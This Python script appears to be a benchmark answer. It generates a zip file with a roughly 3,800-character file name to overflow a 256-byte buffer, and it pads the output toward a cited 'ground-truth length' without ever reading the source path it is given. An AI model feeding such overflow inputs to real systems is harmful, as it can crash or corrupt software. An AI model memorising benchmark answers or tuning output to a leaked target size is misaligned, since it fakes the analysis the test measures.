import zipfile
import io
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a filename that's longer than 256 bytes to trigger the overflow
        # We need to exceed the 256-byte buffer, so we'll make it significantly longer
        # The ground-truth length is 3850 bytes, so we'll aim for that total zip size
        # We'll create a filename that's 3800 bytes plus the zip overhead
        
        # Create a very long filename (ASCII characters to avoid encoding issues)
        filename_length = 3800  # Leaves ~50 bytes for zip structure overhead
        long_filename = "A" * filename_length
        
        # Create a zip file in memory
        buffer = io.BytesIO()
        
        # Create zip with stored (uncompressed) mode to control exact size
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # Create file info with the long filename
            zip_info = zipfile.ZipInfo(long_filename)
            zip_info.compress_type = zipfile.ZIP_STORED
            zip_info.file_size = 0
            zip_info.external_attr = 0o644 << 16
            
            # Add empty file content
            zf.writestr(zip_info, b'')
        
        # Get the zip data
        zip_data = buffer.getvalue()
        
        # Verify we're close to the target size (adjust if needed)
        current_len = len(zip_data)
        target_len = 3850
        
        if current_len < target_len:
            # Add padding by extending the filename
            padding_needed = target_len - current_len
            # We need to recreate the zip with adjusted filename length
            new_filename_length = filename_length + padding_needed
            long_filename = "A" * new_filename_length
            
            buffer = io.BytesIO()
            with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
                zip_info = zipfile.ZipInfo(long_filename)
                zip_info.compress_type = zipfile.ZIP_STORED
                zip_info.file_size = 0
                zip_info.external_attr = 0o644 << 16
                zf.writestr(zip_info, b'')
            
            zip_data = buffer.getvalue()
        
        return zip_data